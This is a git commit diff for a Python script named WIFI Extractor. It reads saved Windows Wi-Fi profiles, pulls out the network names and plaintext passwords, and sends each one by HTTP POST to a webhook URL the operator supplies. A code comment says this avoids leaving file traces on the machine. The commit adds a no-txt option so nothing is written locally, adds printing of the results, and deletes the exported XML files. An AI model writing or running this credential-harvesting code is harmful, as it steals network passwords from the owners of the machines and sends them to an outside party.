8c18c724be231ec3b4afa3d29c123e8cd0c01cfc
JuanMella <juanpa_200018@hotmail.com>
2022-12-28 22:05:58 -0300

    feat: change "-o" to no txt option, print output

--- E_WIFI.py
+++ E_WIFI.py
@@ -1,7 +1,7 @@
 '''Thanks for using wifi extractor|Gracias por usar wifi extractor
     GitHub repository: https://github.com/hrdax/WIFI_Extractor
     '''
-
+from time import sleep
 import os, requests, subprocess, click, sys
 import xml.etree.ElementTree as t
 #lista de exportaciones xml que genera el netsh y Wifis
@@ -10,34 +10,31 @@ WIFIs = []
 
 @click.command()
 @click.option('--url', '-u', default='', help='Webhook/POST URL')
-@click.option('--only-webhook', '-o', is_flag=True, help='''Only send data to webhook (whithout creating the txt file) need to specify the url with -u
-                                                         Envía los datos solo a la webhook (sin crear el archivo txt) necesitas especificar la url con -u''')
+@click.option('--no-txt', '-n', is_flag=True, help="No crea el archivo txt | Doesn't create the txt file")
 @click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')
+@click.option('--print-output', '-p', is_flag=True, help='Muestra la salida en la terminal | Shows the output in the terminal')
 
 #funcion principal
-def main(url, only_webhook, version):
+def main(url, no_txt, version,print_output):
     if version == True:
-        print('\nWIFI Extractor\n\nVersion 1.0\n')
+        print('\nWIFI Extractor\n\nVersion 1.2\n')
         sys.exit()
-    elif url != '' and only_webhook == True:
-        extractor(url, only_webhook)
+    elif url != '' and no_txt == True:
+        extractor(url, no_txt,print_output)
         urlweb(url)
-    elif url != '' and only_webhook == False:
-        if url == '-o':
-            only_webhook = True
-        extractor(url, only_webhook)
+    elif url != '' and no_txt == False:
+        if url == '-n':
+            no_txt = True
+        extractor(url, no_txt,print_output)
         urlweb(url)
-    elif only_webhook == True:
-        print('\n***Error: Use -u to specify the url while using -o | Para usar -o debe especificar la URL con -u***\n')
-        sys.exit()
     else:
-        extractor(url,only_webhook)
+        extractor(url,no_txt, print_output)
         print('\nDone! \n\nHecho!\n')
 
 #hara el proceso de extraccion
-def extractor(url, only_webhook):
+def extractor(url, no_txt,print_output):
     #crea el archivo txt
-    if only_webhook == False:
+    if no_txt == False:
         txt = open("Extracciones.txt", "w")
 
     #corre el comando en la command prompt
@@ -49,7 +46,7 @@ def extractor(url, only_webhook):
     #recorre los archivos en la ruta
     for archivo in os.listdir(ruta):
         #encuentra los archivos xml exportados y los agrega
-        if archivo.endswith(".xml"):
+        if archivo.startswith("Wi-Fi-") and archivo.endswith(".xml"):
             Archivos_XML_WIFI.append(archivo)
 
     #contador para la lista de wifis
@@ -63,12 +60,15 @@ def extractor(url, only_webhook):
         contrasena = rt[4][0][1][2].text
         ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
         WIFIs.append(ssid_contrasena)
+        os.remove(archivo)
         try:
             txt.write(WIFIs[conta]+"\n")
         except:
             pass
         conta = conta + 1
-        os.remove(archivo)
+        if print_output == True:
+            print(f'\n{ssid_contrasena}\n')
+            sleep(0.1)
 
     try: 
         #cierra el archivo txt
@@ -78,13 +78,17 @@ def extractor(url, only_webhook):
 
 #envia a la url de webhook si se especifica con la opcion -u
 def urlweb(url):
-
+    conta = 0
     #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
     urlpost = url
     try:
+        print('\nSending... | Enviando...\n')
         #envia los datos a la url de webhook
         for i in WIFIs:
+            conta = conta + 1
             requests.post(urlpost, data=i)
+            print(f'Sent: {conta} of {len(WIFIs)}\n\nEnviado: {conta} de {len(WIFIs)}\n')
+            
         print('\nDone! \n\nHecho!\n')
     except:
         print('\n***Error could not send: url not specified or invalid url | url no especificada o es invalida***\n')
